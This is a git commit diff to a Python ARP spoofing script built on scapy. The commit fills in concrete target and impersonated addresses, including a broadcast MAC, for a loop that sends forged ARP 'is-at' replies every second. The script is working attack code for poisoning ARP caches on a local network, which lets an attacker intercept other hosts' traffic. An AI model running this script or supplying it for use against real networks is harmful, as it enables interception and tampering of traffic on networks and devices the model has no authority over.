22648e9369efb2d2ae7b9f3cc1d67be934849e8f
MRAZy123 <104674200+Moroz314@users.noreply.github.com>
2024-12-25 22:18:41 +0300

    Update arp_spoofer.py

--- ArpSpoofer/arp_spoofer.py
+++ ArpSpoofer/arp_spoofer.py
@@ -6,9 +6,9 @@ def spoof(target_ip, target_mac, host_ip):
     arp_response = sc.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
     sc.send(arp_response, verbose=0)
 
-target_ip = "your target"
-target_mac = "your target mac"
-host_ip = "who you want to be"
+target_ip = "192.168.23.255"
+target_mac = "ff:ff:ff:ff:ff:ff"
+host_ip = "192.168.23.8"
 
 
 while True:
@@ -17,3 +17,6 @@ while True:
     # telling the `host` that we are the `target`
     # sleep for one second
     time.sleep(1)
+
+
+  
